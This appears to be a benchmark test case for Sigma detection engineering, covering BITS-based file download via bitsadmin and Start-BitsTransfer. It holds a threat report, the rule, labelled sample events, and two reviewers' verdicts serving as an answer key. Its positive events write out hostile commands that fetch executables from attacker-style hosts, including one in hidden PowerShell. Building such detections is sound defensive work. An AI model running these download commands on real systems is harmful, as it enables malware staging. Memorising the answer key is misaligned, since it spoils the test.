id: CTL1-06
role: control
defect_class: NONE
evasive: false
why: 'Correct rule: tags match T1197 and T1105, all values (bitsadmin.exe, /transfer, /download, powershell.exe,
  Start-BitsTransfer) are quoted in the evidence, each of the two alternatives has its own discriminating
  command-line term, and BITS job listing or the Get-BitsTransfer cmdlet do not match.'
expected_gate: none
report_text: BITS was used as a quiet downloader on infected hosts. A scheduled script ran bitsadmin.exe
  /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe, and in
  a second wave the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument
  pointing at the same server. Both forms create a BITS job that survives a reboot until the transfer
  completes. The bitsadmin.exe /transfer switch together with /download is the telltale combination on
  the command line, and the cmdlet name Start-BitsTransfer is the equivalent marker for the PowerShell
  form.
evidence:
- bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe
- the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument pointing
  at the same server
logsource: windows_process_creation
techniques:
- T1197
- T1105
sigma_yaml: |
  title: BITS Job Download via Bitsadmin or Start-BitsTransfer
  id: b051cf63-8297-4eb0-9446-71c392e46f06
  status: experimental
  description: 'Detects bitsadmin.exe creating a download transfer, or powershell.exe calling Start-BitsTransfer, to fetch a remote file.'
  references:
    - 'urn:atidep:case'
  author: case-author
  date: 2026/10/02
  tags:
    - attack.execution
    - attack.persistence
    - attack.stealth
    - attack.command_and_control
    - attack.t1197
    - attack.t1105
  logsource:
    category: process_creation
    product: windows
  detection:
    selection_bitsadmin:
      Image|endswith: '\bitsadmin.exe'
      CommandLine|contains|all:
        - '/transfer'
        - '/download'
    selection_powershell:
      Image|endswith: '\powershell.exe'
      CommandLine|contains: 'Start-BitsTransfer'
    condition: 1 of selection*
  falsepositives:
    - 'Software deployment scripts that use BITS to fetch installers'
  level: medium
assumptions: []
events:
  positive:
  - kind: process_create
    image: C:\Windows\System32\bitsadmin.exe
    cmd: bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\Users\Public\p.exe
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe /c
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\bitsadmin.exe
    cmd: bitsadmin /transfer j1 /download http://files.cranemail.test/a.dll C:\Windows\Temp\a.dll
    parent: C:\Windows\System32\wscript.exe
    parent_cmd: wscript.exe //B C:\Users\alice\AppData\Local\Temp\inv.js
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -nop -w hidden -c Start-BitsTransfer -Source http://203.0.113.60/p.exe -Destination
      C:\Users\Public\p.exe
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe /c
    user: LAB\bob
    dest_ip: null
    dest_port: null
    name: null
  negative:
  - kind: process_create
    image: C:\Program Files\Google\Chrome\Application\chrome.exe
    cmd: '"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default'
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\schtasks.exe
    cmd: schtasks /query /fo LIST
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -Command "Get-Service | Where-Object Status -eq Running"
    parent: C:\Windows\explorer.exe
    parent_cmd: explorer.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  lookalike:
  - kind: process_create
    image: C:\Windows\System32\bitsadmin.exe
    cmd: bitsadmin.exe /list /allusers
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
  - kind: process_create
    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    cmd: powershell.exe -Command Get-BitsTransfer
    parent: C:\Windows\System32\cmd.exe
    parent_cmd: cmd.exe
    user: LAB\alice
    dest_ip: null
    dest_port: null
    name: null
tamper_sigma_yaml: ''
review:
  verdicts:
  - reviewer: R2
    role: primary
    verdict: present
    confidence: 88
    reasoning: 'YAML parses and pySigma accepts it with no errors. All 12 top-level keys are present,
      with a valid UUID, status experimental and date 2026/10/02. Tags match the table for T1197 (execution,
      persistence, stealth) and T1105 (command_and_control), and both techniques are cited. Every discriminating
      value (bitsadmin.exe, /transfer, /download, powershell.exe, Start-BitsTransfer) is covered by the
      two verbatim evidence quotes, which I confirmed occur in report_text. Only allowed fields and modifiers
      are used, and each OR alternative of ''1 of selection*'' has a long CommandLine term. By hand: all
      three positives match (two bitsadmin /transfer /download, one powershell Start-BitsTransfer), and
      none of the negatives match. Neither look-alike matches (bitsadmin /list lacks /transfer; Get-BitsTransfer
      is not Start-BitsTransfer). The baseline summary lists no matching command lines.'
    events_ok: true
    incidental_issues:
    - 'Coverage is narrow: pwsh.exe is not covered, and bitsadmin /transfer without an explicit /download
      (the default direction) would be missed. The report itself defines the pairing, so this is not a
      defect.'
    - The baseline has 25 powershell.exe events, of which only two command lines are listed, so the 0.5
      percent breadth check relies on the summary.
  - reviewer: R4
    role: replacement
    verdict: present
    confidence: 86
    reasoning: The YAML parses and pySigma accepts it with complete metadata. '1 of selection*' is allowed
      and only Image and CommandLine are used. The tags execution, persistence and stealth plus t1197
      match the table row for T1197, and command_and_control plus t1105 match T1105. Both quotations appear
      word for word. 'bitsadmin.exe', '/transfer' and '/download' are in quote 1, and 'powershell.exe'
      and 'Start-BitsTransfer' are in quote 2. By hand, positives 1 and 2 match selection_bitsadmin (bitsadmin
      with /transfer and /download) and positive 3 matches selection_powershell (powershell.exe with Start-BitsTransfer).
      The negatives (chrome, schtasks, powershell Get-Service) and the look-alikes (bitsadmin /list /allusers,
      powershell Get-BitsTransfer) do not match. Each alternative has a CommandLine term of at least 9
      characters, and the frequent powershell command lines in the baseline summary (backup.ps1, Get-Service)
      do not contain Start-BitsTransfer.
    events_ok: true
    incidental_issues:
    - selection_powershell anchors on \powershell.exe only, so pwsh.exe and encoded-command (-enc) forms
      of Start-BitsTransfer are missed. This is a coverage gap, not a defect for this case.
    - bitsadmin /transfer defaults to download when /download is omitted, so requiring /download misses
      that form. The report explicitly names the pair as the marker.
    - Positive 3 runs Start-BitsTransfer synchronously, without -Asynchronous, so it does not exactly
      show the reboot-surviving job the report describes. The event is still a BITS download.
